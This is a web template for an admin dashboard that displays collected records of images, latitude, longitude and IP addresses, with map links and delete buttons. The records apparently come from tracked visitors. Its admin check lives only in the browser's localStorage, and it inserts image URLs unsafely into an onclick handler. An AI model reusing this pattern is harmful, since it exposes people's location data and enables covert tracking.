<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Admin Dashboard</title>
<script src="https://cdn.tailwindcss.com"></script>

<style>
  body {
    background: #0b0b0b;
  }
</style>
</head>

<body class="text-white">

<script>
if (localStorage.getItem("isAdmin") !== "true") {
  window.location.href = "/admin";
}
function logout() {
  localStorage.removeItem("isAdmin");
  window.location.href = "/admin";
}
</script>

<!-- HEADER -->
<header class="sticky top-0 bg-black/80 backdrop-blur border-b border-gray-800">
  <div class="max-w-7xl mx-auto px-4 py-4 flex justify-between items-center">
    <h1 class="text-xl sm:text-2xl font-semibold">
      Admin Dashboard
    </h1>

    <button onclick="logout()"
      class="text-sm text-red-400 hover:text-red-500">
      Logout
    </button>
  </div>
</header>

<!-- ACTION BAR -->
<section class="max-w-7xl mx-auto px-4 py-6">
  <form method="POST" action="/delete-all" class="flex justify-end">
    <button
      class="bg-red-600 hover:bg-red-700 text-white
             px-4 py-2 rounded-lg text-sm font-medium transition">
      Delete All
    </button>
  </form>
</section>

<!-- DATA GRID -->
<section class="max-w-7xl mx-auto px-4 pb-10">
  <div class="grid gap-4 sm:grid-cols-2 lg:grid-cols-3">
    <% data.forEach(item => { %>
      <div class="bg-black/60 border border-gray-800 rounded-xl p-4
                  hover:border-gray-600 transition">

        <!-- IMAGE PREVIEW -->
        <% if (item.imageUrl) { %>
          <img 
            src="<%= item.imageUrl %>"
            onclick="openPreview('<%= item.imageUrl %>')"
            class="w-full h-40 object-cover rounded-lg mb-3
                   border border-gray-700 cursor-pointer
                   hover:opacity-80 transition"
          />
        <% } %>

        <div class="space-y-1 text-sm text-gray-300">
          <p><span class="text-gray-500">Latitude:</span> <%= item.lat %></p>
          <p><span class="text-gray-500">Longitude:</span> <%= item.lon %></p>
          <p><span class="text-gray-500">IP:</span> <%= item.ip %></p>
        </div>

        <div class="flex justify-between items-center mt-4">
          <a target="_blank"
             class="text-blue-400 hover:underline text-sm"
             href="https://www.google.com/maps?q=<%= item.lat %>,<%= item.lon %>">
            View Map
          </a>

          <form method="POST" action="/delete/<%= item._id %>">
            <button
              class="text-sm text-red-400 hover:text-red-500">
              Delete
            </button>
          </form>
        </div>

      </div>
    <% }) %>
  </div>
</section>
</body>
</html>